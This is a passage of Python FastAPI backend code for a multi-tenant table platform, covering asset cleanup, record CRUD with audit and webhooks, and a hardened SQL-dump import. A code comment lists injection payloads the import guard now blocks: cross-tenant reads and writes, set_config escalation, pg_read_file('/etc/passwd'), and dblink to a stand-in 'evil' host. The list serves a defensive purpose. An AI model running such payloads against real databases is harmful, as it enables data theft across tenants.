    return {"data": [_asset_dict(a) for a in rows], "total": total, "limit": limit, "offset": offset}


@app.delete("/api/assets/{asset_id}")
def delete_asset(
    asset_id: int,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """M8 F1: delete explícito de asset. Referenciado (refcount>0) → 409."""
    tenant_id = _media_tenant_or_403(current_user)
    asset = db.query(models.Asset).filter(
        models.Asset.id == asset_id, models.Asset.owner_id == tenant_id
    ).first()
    if not asset:
        raise HTTPException(status_code=404, detail="Asset not found")
    if (asset.refcount or 0) > 0:
        raise HTTPException(
            status_code=409,
            detail=f"Asset em uso ({asset.refcount} referência(s)). Remova das células primeiro.",
        )
    path = asset.path
    _aid, _aname = asset.id, asset.original_name
    db.delete(asset)
    audit.record(
        db, owner_id=tenant_id, actor=audit.user_actor(current_user),
        action=audit.ASSET_DELETE, target_type=audit.T_ASSET,
        target_id=_aid, target_label=_aname,
    )
    db.commit()
    media_storage.remove([path])  # pós-commit, best-effort
    return {"message": "Asset deleted"}


@app.post("/api/assets/gc")
def gc_assets(
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """M8 F1: sweep de órfãos (refcount==0 com idade mínima de 24h). Nunca
    roda automático nos hooks (decisão #3 — snapshot publicado pode
    referenciar mídia) — invocação explícita do workspace.

    M8 F5: o mesmo sweep também reconcilia as CÓPIAS de snapshot órfãs
    (`{owner}/pub/vN__…` cujo vN não existe mais em `_publication_versions`)
    — campo `removed_pub_copies` aditivo na resposta."""
    import datetime as _dt
    tenant_id = _media_tenant_or_403(current_user)
    cutoff = _dt.datetime.utcnow() - _dt.timedelta(hours=media_storage.GC_MIN_AGE_HOURS)
    orphans = db.query(models.Asset).filter(
        models.Asset.owner_id == tenant_id,
        models.Asset.refcount <= 0,
        models.Asset.created_at < cutoff,
    ).all()
    paths = [a.path for a in orphans]
    for a in orphans:
        db.delete(a)
    if paths:
        # Agregado, como o import: N blobs apagados = 1 evento. Sem isso, uma
        # varrida que come mídia demais some da história.
        audit.record(
            db, owner_id=tenant_id, actor=audit.user_actor(current_user),
            action=audit.ASSET_GC, target_type=audit.T_WORKSPACE, target_id=tenant_id,
            details={"removed": len(paths)},
        )
    db.commit()
    media_storage.remove(paths)  # pós-commit, best-effort

    # F5: reconcile das cópias de snapshot órfãs (never-raise, guarda de 24h).
    live = {
        r[0]
        for r in db.query(models.PublicationVersion.version_number)
        .filter(models.PublicationVersion.owner_id == tenant_id)
        .all()
    }
    removed_pub = media_storage.reconcile_pub_media(tenant_id, live)
    return {"removed": len(paths), "removed_pub_copies": removed_pub}


@app.get("/api/assets/dev/{owner_id}/{filepath:path}")
def serve_dev_asset(owner_id: int, filepath: str, db: Session = Depends(get_db)):
    """Serve os bytes do fallback filesystem em dev (sem Supabase). Espelha a
    semântica da URL pública do bucket: sem auth, path opaco. Em prod
    (Supabase configurado) é 404 — a URL pública é a do Storage.

    `{filepath:path}` aceita subpasta (ex.: `pub/vN__…` das cópias de snapshot
    da F3, M8) — não só filename flat. Guard de path-traversal por segmento."""
    if supabase_admin.is_configured():
        raise HTTPException(status_code=404, detail="Not found")
    segs = filepath.split("/")
    if "\\" in filepath or any(s == "" or s == ".." or s.startswith(".") for s in segs):
        raise HTTPException(status_code=404, detail="Not found")
    path = f"{owner_id}/{filepath}"
    body = media_storage.read_dev(path)
    if body is None:
        raise HTTPException(status_code=404, detail="Not found")
    # Asset gerenciado tem `mime` em _assets; a CÓPIA de snapshot (F3) não tem
    # linha em _assets — infere o MIME pela extensão pra o <img> renderizar.
    asset = db.query(models.Asset).filter(models.Asset.path == path).first()
    if asset:
        mime = asset.mime
    else:
        import mimetypes
        mime = mimetypes.guess_type(path)[0] or "application/octet-stream"
    return Response(content=body, media_type=mime)

# ==========================================
# Public Tables (No Auth)
# ==========================================

@app.get("/public/tables/")
def get_public_tables(db: Session = Depends(get_db)):
    tables = db.query(models.DynamicTable).filter(models.DynamicTable.is_public == True).all()
    result = []
    for t in tables:
        cols = db.query(models.DynamicColumn).filter(models.DynamicColumn.table_id == t.id).all()
        result.append({
            "id": t.id,
            "name": t.name,
            "description": t.description,
            "columns": [{"name": c.name, "data_type": c.data_type, "is_primary": c.is_primary} for c in cols]
        })
    return result

@app.get("/public/api/{table_name}/columns")
def get_public_table_columns(table_name: str, db: Session = Depends(get_db)):
    db_table = db.query(models.DynamicTable).filter(
        models.DynamicTable.name == table_name,
        models.DynamicTable.is_public == True
    ).first()
    if not db_table:
        raise HTTPException(status_code=404, detail="Table not found or not public")
    cols = db.query(models.DynamicColumn).filter(models.DynamicColumn.table_id == db_table.id).all()
    return [{"name": c.name, "data_type": c.data_type, "is_nullable": c.is_nullable, "is_unique": c.is_unique, "is_primary": c.is_primary} for c in cols]

@app.get("/public/api/{table_name}")
def get_public_records(
    filter_col: str = None, filter_val: str = None, filter_op: str = "eq",
    sort: str = None, order: str = "asc",
    search: str = None,
    limit: int = 100, offset: int = 0,
    tenant_ctx: tuple = Depends(public_tenant_db),
):
    db, db_table = tenant_ctx

    try:
        table = _load_physical_table(db_table)
    except Exception:
        raise HTTPException(status_code=404, detail="Physical table not found")
    
    stmt = select(table)
    
    # Apply column filter
    if filter_col and filter_val and filter_col in [c.name for c in table.columns]:
        col = table.c[filter_col]
        if filter_op == "eq":
            stmt = stmt.where(col == filter_val)
        elif filter_op == "contains":
            stmt = stmt.where(col.cast(String).ilike(f"%{filter_val}%"))
        elif filter_op == "gt":
            stmt = stmt.where(col > filter_val)
        elif filter_op == "lt":
            stmt = stmt.where(col < filter_val)
        elif filter_op == "gte":
            stmt = stmt.where(col >= filter_val)
        elif filter_op == "lte":
            stmt = stmt.where(col <= filter_val)
        elif filter_op == "neq":
            stmt = stmt.where(col != filter_val)
    
    # Apply search across all string columns
    if search:
        from sqlalchemy import or_, cast
        search_conditions = []
        for col in table.columns:
            search_conditions.append(cast(col, String).ilike(f"%{search}%"))
        if search_conditions:
            stmt = stmt.where(or_(*search_conditions))
    
    # Count total before pagination
    from sqlalchemy import func
    count_stmt = select(func.count()).select_from(stmt.subquery())
    total = db.execute(count_stmt).scalar()
    
    # Apply sorting
    if sort and sort in [c.name for c in table.columns]:
        sort_col = table.c[sort]
        stmt = stmt.order_by(sort_col.desc() if order == "desc" else sort_col.asc())

    # F0: mesma regra da rota autenticada — PK como desempate sempre.
    stmt = ordem_estavel(stmt, table)

    # Apply pagination
    stmt = stmt.limit(min(limit, 500)).offset(offset)
    
    result = db.execute(stmt)
    records = [dict(row._mapping) for row in result.fetchall()]
    return {"data": records, "total": total, "limit": limit, "offset": offset}

@app.get("/public/relations/")
def get_public_relations(db: Session = Depends(get_db)):
    """Return all relations where both tables are public"""
    public_ids = [t.id for t in db.query(models.DynamicTable).filter(models.DynamicTable.is_public == True).all()]
    relations = db.query(models.DynamicRelation).filter(
        models.DynamicRelation.from_table_id.in_(public_ids),
        models.DynamicRelation.to_table_id.in_(public_ids)
    ).all()
    result = []
    for r in relations:
        from_t = db.query(models.DynamicTable).filter(models.DynamicTable.id == r.from_table_id).first()
        to_t = db.query(models.DynamicTable).filter(models.DynamicTable.id == r.to_table_id).first()
        result.append({
            "id": r.id, "name": r.name,
            "from_table": from_t.name if from_t else None,
            "to_table": to_t.name if to_t else None,
            "relation_type": r.relation_type
        })
    return result

# ==========================================
# Dynamic Data CRUD (Authenticated)
# ==========================================

@app.post("/api/{table_name}")
async def create_record(
    table_name: str,
    request: Request,
    db: Session = Depends(tenant_db_principal),
    principal: Principal = Depends(get_principal),
):
    # v1: key é só-leitura → 403 aqui dentro (`authorize_table` decide).
    db_table = authorize_table(principal, table_name, api_keys.WRITE, db)

    try:
        table = _load_physical_table(db_table)
    except Exception:
        raise HTTPException(status_code=404, detail="Physical table not found")

    data = await request.json()
    # Em Postgres, RLS força tenant_id via WITH CHECK. Sobrescrevemos no
    # backend pra impedir cliente malicioso de tentar forjar outro tenant.
    if is_postgres() and "tenant_id" in table.columns:
        data["tenant_id"] = db_table.tenant_id

    stmt = insert(table).values(**data)
    result = db.execute(stmt)
    # F1: célula mídia referenciando asset → refcount +1 (no-op pra URL
    # externa/valor não-gerenciado). Mesma sessão tenant_db — atômico com o
    # INSERT no commit do teardown.
    media_cleanup.on_record_insert(db, db_table, data)
    new_id = result.inserted_primary_key[0]
    # M9 F1: caminho ATÔMICO (mesma transação do INSERT). `changed_columns` são
    # as chaves do body — nomes, nunca valores.
    audit.record(
        db, owner_id=db_table.owner_id, actor=principal_actor(principal, request),
        action=audit.RECORD_CREATE, target_type=audit.T_TABLE, target_id=db_table.id,
        target_label=db_table.name, target_row_id=new_id,
        changed_columns=[k for k in data.keys() if k != "tenant_id"],
    )
    # M9 F3: outbox na MESMA transação. O snapshot é RELIDO (não é o `data` do
    # body) porque o banco preencheu defaults que o cliente não mandou — e o
    # consumidor recebe a linha como ela ficou, não como foi pedida.
    _pk_col = next((c for c in table.primary_key.columns), table.columns.get("id"))
    emit_webhook(
        db, owner_id=db_table.owner_id, event=webhooks.EV_CREATED,
        table_name=db_table.name, pk=new_id,
        row_factory=(lambda: _row_snapshot(db, table, _pk_col, new_id)) if _pk_col is not None else (lambda: data),
        actor=principal_actor(principal, request),
    )
    return {"message": "Record inserted", "id": new_id}

@app.get("/api/{table_name}")
def get_records(
    table_name: str,
    filter_col: str = None, filter_val: str = None, filter_op: str = "eq",
    sort: str = None, order: str = "asc",
    search: str = None,
    limit: int = 100, offset: int = 0,
    request: Request = None,
    db: Session = Depends(tenant_db_principal),
    principal: Principal = Depends(get_principal),
):
    """M-Ops F3: a rota autenticada agora pagina como a pública (antes fazia
    fetchall e baixava a tabela inteira). Resposta: {data, total, limit, offset}.
    Mesmo template da pública (get_public_records): filtro (7 ops) + search +
    sort + limit(cap 500) + offset.

    M9 F2: é a rota que a API key alcança pra ler dado — e a única leitura que
    entra no audit (decisão 1: leitura humana fica fora, leitura por key não)."""
    db_table = authorize_table(principal, table_name, api_keys.READ, db)

    try:
        table = _load_physical_table(db_table)
    except Exception:
        raise HTTPException(status_code=404, detail=f"Physical table {table_name} not found")

    stmt = select(table)

    # filtro por coluna (mesmas 7 ops da pública)
    if filter_col and filter_val and filter_col in [c.name for c in table.columns]:
        col = table.c[filter_col]
        if filter_op == "eq":
            stmt = stmt.where(col == filter_val)
        elif filter_op == "contains":
            stmt = stmt.where(col.cast(String).ilike(f"%{filter_val}%"))
        elif filter_op == "gt":
            stmt = stmt.where(col > filter_val)
        elif filter_op == "lt":
            stmt = stmt.where(col < filter_val)
        elif filter_op == "gte":
            stmt = stmt.where(col >= filter_val)
        elif filter_op == "lte":
            stmt = stmt.where(col <= filter_val)
        elif filter_op == "neq":
            stmt = stmt.where(col != filter_val)

    # busca em todas as colunas (cast pra string)
    if search:
        from sqlalchemy import or_, cast
        conditions = [cast(c, String).ilike(f"%{search}%") for c in table.columns]
        if conditions:
            stmt = stmt.where(or_(*conditions))

    # total ANTES da paginação
    total = db.execute(select(func.count()).select_from(stmt.subquery())).scalar()

    # ordenação
    if sort and sort in [c.name for c in table.columns]:
        sort_col = table.c[sort]
        stmt = stmt.order_by(sort_col.desc() if order == "desc" else sort_col.asc())

    # F0: PK como desempate SEMPRE, inclusive quando o usuário já ordenou —
    # sem isso a paginação perde e repete linha enquanto outra pessoa edita.
    stmt = ordem_estavel(stmt, table)

    # paginação (cap 500, igual à pública)
    stmt = stmt.limit(min(limit, 500)).offset(offset)

    records = [dict(row._mapping) for row in db.execute(stmt).fetchall()]

    # M9 F2: leitura por KEY entra na trilha; leitura humana não (decisão 1).
    # `rows`/`offset`/`total` são o que torna a detecção possível: sem eles,
    # mil requests de 1 linha e um request de mil linhas seriam idênticos.
    if principal.is_key:
        audit.record(
            db, owner_id=db_table.owner_id, actor=principal_actor(principal, request),
            action=audit.RECORD_READ, target_type=audit.T_TABLE,
            target_id=db_table.id, target_label=db_table.name,
            details={"rows": len(records), "offset": offset, "limit": limit,
                     "total": total, "filtered": bool(filter_col or search)},
        )
    return {"data": records, "total": total, "limit": limit, "offset": offset}

@app.put("/api/{table_name}/{record_id}")
async def update_record(
    table_name: str,
    record_id: int,
    request: Request,
    db: Session = Depends(tenant_db_principal),
    principal: Principal = Depends(get_principal),
):
    db_table = authorize_table(principal, table_name, api_keys.WRITE, db)

    try:
        table = _load_physical_table(db_table)
    except Exception:
        raise HTTPException(status_code=404, detail=f"Physical table {table_name} not found")

    pk_col = next((c for c in table.primary_key.columns), None)
    if pk_col is None:
        if 'id' in table.columns:
            pk_col = table.columns['id']
        else:
            raise HTTPException(status_code=400, detail="No primary key found for this table")

    data = await request.json()
    # Não deixar cliente alterar tenant_id via UPDATE.
    if is_postgres() and "tenant_id" in data:
        data.pop("tenant_id", None)

    # F0: lê a row antiga ANTES do update — gêmeo do read-before-delete. F1 usa
    # pra detectar troca de valor de coluna mídia (orfana o asset antigo).
    old = db.execute(select(table).where(pk_col == record_id)).first()
    if old is None:
        raise HTTPException(status_code=404, detail="Record not found")
    db.execute(update(table).where(pk_col == record_id).values(**data))
    # F1: troca de valor em coluna mídia decrementa o antigo e incrementa o
    # novo (chave ausente no body parcial = não mudou). O blob antigo vira
    # órfão até o GC — nunca é removido aqui (decisão #3/#9).
    media_cleanup.on_record_update(db, db_table, dict(old._mapping), data)
    # M9 F1: o body do update é PARCIAL — as chaves presentes SÃO as colunas
    # mudadas. Registrar os nomes é o suficiente pra trilha; o valor fica fora.
    audit.record(
        db, owner_id=db_table.owner_id, actor=principal_actor(principal, request),
        action=audit.RECORD_UPDATE, target_type=audit.T_TABLE, target_id=db_table.id,
        target_label=db_table.name, target_row_id=record_id,
        changed_columns=list(data.keys()),
    )
    # M9 F3 (decisão G-A): vai a linha INTEIRA, não o diff. O body do PUT é
    # parcial e o PK vem no path — mandar só o que mudou entregaria ao
    # consumidor uma mudança sem identidade da linha.
    emit_webhook(
        db, owner_id=db_table.owner_id, event=webhooks.EV_UPDATED,
        table_name=db_table.name, pk=record_id,
        row_factory=lambda: _row_snapshot(db, table, pk_col, record_id),
        actor=principal_actor(principal, request),
        extra={"changed": list(data.keys())},
    )
    return {"message": "Record updated"}

@app.delete("/api/{table_name}/{record_id}")
def delete_record(
    table_name: str,
    record_id: int,
    request: Request,
    db: Session = Depends(tenant_db_principal),
    principal: Principal = Depends(get_principal),
):
    db_table = authorize_table(principal, table_name, api_keys.WRITE, db)

    try:
        table = _load_physical_table(db_table)
    except Exception:
        raise HTTPException(status_code=404, detail=f"Physical table {table_name} not found")

    pk_col = next((c for c in table.primary_key.columns), None)
    if pk_col is None:
        if 'id' in table.columns:
            pk_col = table.columns['id']
        else:
            raise HTTPException(status_code=400, detail="No primary key found for this table")

    # F0: lê a row ANTES de deletar — F1 usa pra achar paths de mídia no cleanup.
    existing = db.execute(select(table).where(pk_col == record_id)).first()
    if existing is None:
        raise HTTPException(status_code=404, detail="Record not found")
    db.execute(delete(table).where(pk_col == record_id))
    # F1: valores de mídia da row deletada → refcount -1 (blob fica; GC cuida).
    media_cleanup.on_record_delete(db, db_table, dict(existing._mapping))
    # M9 F1: o delete é o evento que hoje não deixa rastro NENHUM (a tabela
    # dinâmica não tem nem `updated_at`) — é o caso-motivador do audit.
    # `changed_columns` fica vazio de propósito: apagar não muda coluna.
    audit.record(
        db, owner_id=db_table.owner_id, actor=principal_actor(principal, request),
        action=audit.RECORD_DELETE, target_type=audit.T_TABLE, target_id=db_table.id,
        target_label=db_table.name, target_row_id=record_id,
    )
    # M9 F3: a linha vai como estava ANTES de sumir. É a última vez que esse
    # dado existe — sem ele o consumidor não sabe nem o que apagar do lado dele.
    emit_webhook(
        db, owner_id=db_table.owner_id, event=webhooks.EV_DELETED,
        table_name=db_table.name, pk=record_id, row=dict(existing._mapping),
        actor=principal_actor(principal, request),
    )
    return {"message": "Record deleted"}

# ==========================================
# SQL Script Import (Admin only)
# ==========================================
import sqlglot
from sqlglot import exp

from sqlalchemy import inspect as _inspect

# ── B13: a forma permitida do statement importado ────────────────────────
#
# O parser antigo classificava só o NÓ DE TOPO (`isinstance(stmt, exp.Create)`
# / `exp.Insert`) e reescrevia só a PRIMEIRA `exp.Table` da árvore. Tudo que
# estivesse dentro passava intacto. Medido no parser real, TUDO abaixo era
# aceito por um admin comum enviando um `.sql`:
#
#   INSERT INTO minha SELECT * FROM t5_alheia        -> leitura cross-tenant
#   CREATE TABLE roubo AS SELECT * FROM tenant_5.x   -> cópia de outro workspace
#   CREATE TABLE dump AS SELECT * FROM users         -> hashes de senha
#   INSERT INTO tenant_2.alvo (c) VALUES (1)         -> ESCRITA em outro tenant
#   INSERT INTO t (c) SELECT set_config('app.is_master','true',false)
#   INSERT INTO t (c) SELECT pg_read_file('/etc/passwd')
#   INSERT INTO t (c) SELECT dblink('host=evil','...')
#   CREATE TABLE x (c text DEFAULT set_config(...))  -> função no DEFAULT
#   INSERT INTO t (c) VALUES (1) RETURNING set_config(...)
#
# A trava NÃO é lista de funções proibidas: essa lista envelhece a cada versão
# do Postgres, e o atacante só precisa de uma que ninguém lembrou. É o inverso —
# uma ALLOWLIST DE FORMA. O caso de uso é dump de ferramenta: `CREATE TABLE` com
# colunas e `INSERT ... VALUES` com literais. Qualquer coisa fora disso é
# recusada, mesmo que pareça inofensiva.
#
# Custo aceito e declarado: `INSERT ... SELECT` deixa de funcionar. Nenhum dump
# de ferramenta gera isso, e era exatamente essa a forma que exfiltrava.
_EXPR_PROIBIDA = (
    exp.Select,      # subquery/CTAS em qualquer posição
    exp.Subquery,
    exp.With,        # CTE escondendo a origem
    exp.Union,
    exp.Func,        # qualquer chamada de função…
    exp.Anonymous,   # …inclusive as que o sqlglot não conhece pelo nome
)


def _rejeita_forma(stmt, tipo: str) -> str | None:
    """Devolve o motivo da recusa, ou None se a forma é permitida."""
    # 1. Nome qualificado por schema/catálogo escapa do prefixo do tenant.
    #    `INSERT INTO tenant_2.alvo` gravava no schema de OUTRO admin — provado.
    for tabela in stmt.find_all(exp.Table):
        if tabela.args.get("db") or tabela.args.get("catalog"):
            return ("nome qualificado por schema não é aceito no import "
                    f"('{tabela.sql(dialect='sqlite')}') — use só o nome da tabela")

    # 2. Uma tabela só: a do alvo. Toda origem extra (FROM/JOIN/CTE) é leitura
    #    que o import não tem por que fazer, e era o vetor de exfiltração.
    tabelas = list(stmt.find_all(exp.Table))
    if len(tabelas) != 1:
        return (f"o statement referencia {len(tabelas)} tabelas; o import aceita "
                "só a tabela de destino (sem SELECT de outra tabela)")

    # 3. Nenhuma expressão executável em lugar nenhum da árvore.
    for no in stmt.walk():
        if isinstance(no, _EXPR_PROIBIDA):
            nome = getattr(no, "name", None) or no.__class__.__name__
            return (f"expressão não permitida no import ({nome}) — só CREATE TABLE "
                    "com colunas e INSERT ... VALUES com literais")

    # 4. RETURNING executa expressão depois do INSERT.
    if stmt.args.get("returning"):
        return "RETURNING não é aceito no import"
    return None


# Teto de cláusulas FK lidas por statement. `_relations` não tem unique
# constraint (models.py), então um CREATE com 50 mil FKs repetidas viraria 50
# mil linhas — e `GET /tables/` conta relação por tabela, então o inchaço
# degrada a leitura DE TODOS OS TENANTS, não só a de quem importou.
MAX_FKS_POR_STATEMENT = 64


def _extrai_e_remove_fks(stmt) -> list[dict]:
    """Extrai as cláusulas FK de um CREATE TABLE e as REMOVE da árvore.

    O import nunca executa DDL que mencione duas tabelas (é o guard do B13).
    Em vez de recusar o arquivo inteiro por causa da FK, tiramos a cláusula do
    DDL — a tabela física nasce sem constraint, exatamente como antes — e
    devolvemos a intenção pra virar relação LÓGICA no catálogo.

    Duas propriedades que sustentam a segurança disso, e nenhuma é acidente:

    1. **A remoção é destrutiva e roda na MESMA árvore que vai pro banco.**
       "Esconder da validação" e "apagar do DDL" são o mesmo ato — não existe
       janela onde a FK sumiu da checagem mas sobreviveu no SQL. É o que mata
       `REFERENCES (SELECT cpf FROM alheia)`: o Select vai embora junto.
    2. **O que sobra ainda enfrenta `_rejeita_forma` inteiro.** Esta função é
       chamada ANTES da checagem de forma, então a allowlist do B13 continua
       valendo palavra por palavra sobre a árvore reduzida. CTAS com FK de
       fachada segue bloqueado.

    Remove o nó ENVELOPE, nunca o `Reference` interno — apagar só o interno
    deixa `CONSTRAINT fk_ab` órfã (SQL inválido e calado) ou `ColumnConstraint`
    sem `kind` (KeyError). As 3 formas e seus envelopes:

        FOREIGN KEY (c) REFERENCES b(i)              -> exp.ForeignKey
        CONSTRAINT n FOREIGN KEY (c) REFERENCES b(i) -> exp.Constraint
        c INTEGER REFERENCES b(i)                    -> exp.ColumnConstraint

    A varredura é por `exp.Reference` e NÃO por `exp.ForeignKey`: a forma
    inline não produz nó `ForeignKey` nenhum (medido — 0 ocorrências).
    """
    achados: list[dict] = []
    for ref in list(stmt.find_all(exp.Reference)):
        # `ref.this` é Schema quando há lista de colunas (`REFERENCES b(id)`)
        # e Table quando não há (`REFERENCES b`).
        alvo = ref.this
        if isinstance(alvo, exp.Schema):
            to_table = alvo.this.name if alvo.this else None
            to_cols = [c.name for c in alvo.expressions]
        elif isinstance(alvo, exp.Table):
            to_table, to_cols = alvo.name, []
        else:
            to_table, to_cols = None, []

        pai = ref.parent
        from_cols: list[str] = []
        envelope = None
        if isinstance(pai, exp.ForeignKey):
            from_cols = [c.name for c in pai.expressions]
            envelope = pai.parent if isinstance(pai.parent, exp.Constraint) else pai
        elif isinstance(pai, exp.ColumnConstraint):
            coldef = pai.parent
            if isinstance(coldef, exp.ColumnDef):
                from_cols = [coldef.name]
            envelope = pai

        if envelope is not None:
            envelope.pop()
        if to_table:
            achados.append({
                "from_column": from_cols[0] if from_cols else None,
                "to_table": to_table,
                "to_column": to_cols[0] if to_cols else None,
            })
        if len(achados) >= MAX_FKS_POR_STATEMENT:
            break
    return achados


def _parse_sql_statements(sql_text: str, prefix: str):
    """Parse SQL text into a list of safe statement info dicts for execution.

    B18: a LEITURA continua em dialeto sqlite (é a árvore que a allowlist do
    B13 inspeciona, e ela não muda), mas a ESCRITA sai no dialeto do banco que
    vai executar. Serializar sempre em sqlite gerava `TEXT(100)` a partir de
    `VARCHAR(100)`, e o Postgres recusa isso com "type modifier is not allowed
    for type text" — ou seja, em produção o import morria em qualquer dump com
    coluna de tamanho, que é basicamente todo dump real. Ninguém viu porque os
    testes de import eram SQLite-only.
    """
    dialeto = "postgres" if is_postgres() else "sqlite"
    results = []
    try:
        parsed_stmts = sqlglot.parse(sql_text, read="sqlite")
    except Exception as e:
        results.append({"type": "UNKNOWN", "status": "blocked", "message": f"Syntax error: {e}"})
        return results

    for stmt in parsed_stmts:
        if stmt is None:
            continue
        try:
            if isinstance(stmt, exp.Create):
                stmt_type = "CREATE"
                if stmt.args.get("kind") != "TABLE":
                    results.append({"type": stmt_type, "status": "blocked", "message": "Only CREATE TABLE is allowed."})
                    continue

                # A remoção das FKs vem ANTES do `find(exp.Table)` de propósito.
                # Depois dele, `table_node` apontaria pra um nó da árvore velha
                # e o `set()` do prefixo (abaixo) mutaria a cópia errada: a
                # tabela nasceria SEM prefixo e o `_tables` registraria um
                # physical_name inexistente. Medido — a ordem é o fix.
                fks = _extrai_e_remove_fks(stmt)

                table_node = stmt.find(exp.Table)
                if not table_node or not table_node.name:
                    results.append({"type": stmt_type, "status": "blocked", "message": "No table name found."})
                    continue

                # B13: a forma tem que ser checada ANTES da reescrita — um CTAS
                # (`CREATE TABLE x AS SELECT * FROM alheia`) tem `kind == TABLE`
                # e passava por aqui.
                motivo = _rejeita_forma(stmt, stmt_type)
                if motivo:
                    results.append({"type": stmt_type, "status": "blocked", "message": motivo})
                    continue

                table_name = table_node.name
                physical_name = f"{prefix}{table_name}"
                # Safely mutate AST
                table_node.set("this", exp.Identifier(this=physical_name, quoted=False))
                safe_sql = stmt.sql(dialect=dialeto)

                results.append({"type": stmt_type, "status": "ok", "table_name": table_name,
                                "physical_name": physical_name, "statement": safe_sql, "fks": fks})

            elif isinstance(stmt, exp.Insert):
                stmt_type = "INSERT"
                table_node = stmt.find(exp.Table)
                if not table_node or not table_node.name:
                    results.append({"type": stmt_type, "status": "blocked", "message": "No table name found in INSERT."})
                    continue

                motivo = _rejeita_forma(stmt, stmt_type)
                if motivo:
                    results.append({"type": stmt_type, "status": "blocked", "message": motivo})
                    continue

                table_name = table_node.name
                physical_name = f"{prefix}{table_name}"
                # Safely mutate AST
                table_node.set("this", exp.Identifier(this=physical_name, quoted=False))
                safe_sql = stmt.sql(dialect=dialeto)

                results.append({"type": stmt_type, "status": "ok", "table_name": table_name, "physical_name": physical_name, "statement": safe_sql})

            else:
                results.append({"type": stmt.__class__.__name__.upper(), "status": "blocked", "message": "Statement not allowed. Only CREATE TABLE and INSERT are supported."})
        except Exception as e:
            results.append({"type": "UNKNOWN", "status": "blocked", "message": str(e)})

    return results


@app.post("/api/import/sql/dry-run")
async def dry_run_sql_import(file: UploadFile = File(...), current_admin: models.User = Depends(get_current_admin)):
    """Parse and validate a .sql file without executing anything. Returns a preview report."""
    if current_admin.role == "master":
        raise HTTPException(status_code=403, detail="Use an admin account for imports")

    content = await file.read()
    sql_text = content.decode("utf-8")
    prefix = get_tenant_prefix(current_admin)
    parsed = _parse_sql_statements(sql_text, prefix)

    inspector = _inspect(engine)
    existing_tables = inspector.get_table_names()

    report = []
    fks_previstas = 0
    for item in parsed:
        entry = {"type": item["type"], "status": item["status"],
                 "message": item.get("message", ""),
                 "table_name": item.get("table_name", "")}
        if item["status"] == "ok" and item["type"] == "CREATE":
            n_fks = len(item.get("fks", []))
            fks_previstas += n_fks
            if item["physical_name"] in existing_tables:
                entry["status"] = "conflict"
                entry["message"] = f"Table '{item['physical_name']}' already exists."
            else:
                entry["message"] = f"Will create table '{item['table_name']}' as '{item['physical_name']}'."
                if n_fks:
                    # A promessa tem que aparecer ANTES do commit: a FK não vira
                    # constraint no banco, vira aresta no catálogo. Quem lê
                    # "vai criar a tabela" e vê relação aparecer foi surpreendido.
                    entry["message"] += (
                        f" {n_fks} chave(s) estrangeira(s) do arquivo viram relação"
                        " declarada no catálogo (sem constraint física).")
            entry["fk_count"] = n_fks
        elif item["status"] == "ok" and item["type"] == "INSERT":
            entry["message"] = f"Will insert into '{item['table_name']}'."
        report.append(entry)

    summary = {
        "total": len(report),
        "ok": sum(1 for r in report if r["status"] == "ok"),
        "blocked": sum(1 for r in report if r["status"] == "blocked"),
        "conflicts": sum(1 for r in report if r["status"] == "conflict"),
        "relations": fks_previstas,
    }
    return {"summary": summary, "statements": report}


@app.post("/api/import/sql")
async def import_sql_script(file: UploadFile = File(...), db: Session = Depends(get_db), current_admin: models.User = Depends(get_current_admin)):
    if current_admin.role == "master":
        raise HTTPException(status_code=403, detail="Use an admin account for imports")

    content = await file.read()
    sql_text = content.decode("utf-8")
    prefix = get_tenant_prefix(current_admin)
    parsed = _parse_sql_statements(sql_text, prefix)

    created_tables = []
    inserted_rows = 0
    errors = []
    # FKs lidas do arquivo, resolvidas só DEPOIS que todas as tabelas existirem
    # (o dump declara a FK antes da tabela alvo existir). Guarda o ID da
    # DynamicTable recém-criada — NUNCA o nome: `_tables.name` não é único
    # entre tenants (models.py, `index=True` sem `unique`), então resolver a
    # origem por nome no 2º passe deixaria a relação nascer saindo da tabela
    # homônima de OUTRO admin. O id é do registro que este import acabou de
    # inserir, então a origem é minha por construção.
    fks_pendentes: list[dict] = []
    relations_created = 0
    warnings: list[str] = []

    for item in parsed:
        if item["status"] != "ok":
            errors.append(item.get("message", f"Blocked: {item['type']}"))
            continue

        if item["type"] == "CREATE":
            table_name = item["table_name"]
            physical_name = item["physical_name"]
            prefixed_stmt = item["statement"]

            # M9 F4: este caminho criava `DynamicTable` SEM passar por trava
            # nenhuma — era o furo do B5. O nome vem de um arquivo `.sql`
            # enviado pelo usuário, então é entrada não-confiável igual às
            # outras. Erro por-statement (o import é parcial por desenho):
            # uma tabela recusada não derruba o resto do arquivo.
            try:
                schemas.validate_table_name(table_name, RESERVED_TABLE_NAMES)
            except ValueError as exc:
                errors.append(f"CREATE recusado para '{table_name}': {exc}")
                continue

            try:
                # Execute DDL
                with engine.begin() as conn:
                    conn.execute(text(prefixed_stmt))

                # Introspect columns from the newly created physical table
                inspector = _inspect(engine)
                cols_info = inspector.get_columns(physical_name)

                # Register _tables + _columns atomically in one commit
                # NB: import SQL ainda usa o caminho legado (prefixo no public). A
                # migração pra schema-per-tenant aqui fica pra um PR futuro porque
                # exige reescrita do parser/`_parse_sql_statements` pra injetar
                # schema + coluna tenant_id na DDL crua importada.
                db_table = models.DynamicTable(
                    name=table_name,
                    description=f"Imported from: {file.filename}",
                    source=file.filename,   # M8.5 F3: a origem citável = o arquivo importado
                    owner_id=current_admin.id,
                    is_public=False,
                    tenant_id=current_admin.id,
                    physical_name=physical_name,  # nome real no DB (legado: com prefixo)
                )
                db.add(db_table)
                db.flush()  # get db_table.id without committing yet

                for col_info in cols_info:
                    db_col = models.DynamicColumn(
                        table_id=db_table.id,
                        name=col_info["name"],
                        # Rótulo canônico, não o nome da classe do dialeto: gravar
                        # `VARCHAR`/`INTEGER` punha a tabela importada por SQL fora
                        # da whitelist e fazia toda leitura por rótulo mentir.
                        data_type=canonical_data_type(col_info["type"]),
                        is_nullable=col_info.get("nullable", True),
                        is_unique=False,
                        is_primary=col_info.get("primary_key", False)
                    )
                    db.add(db_col)

                db.commit()  # single atomic commit for both _tables and _columns
                created_tables.append(table_name)

                # As colunas reais da tabela recém-criada — a FK do arquivo só
                # vira relação se a coluna de origem existir de fato.
                colunas_locais = {c["name"] for c in cols_info}
                for fk in item.get("fks", []):
                    fks_pendentes.append({
                        "from_table_id": db_table.id,
                        "from_table_name": table_name,
                        "from_column": fk["from_column"],
                        "to_table": fk["to_table"],
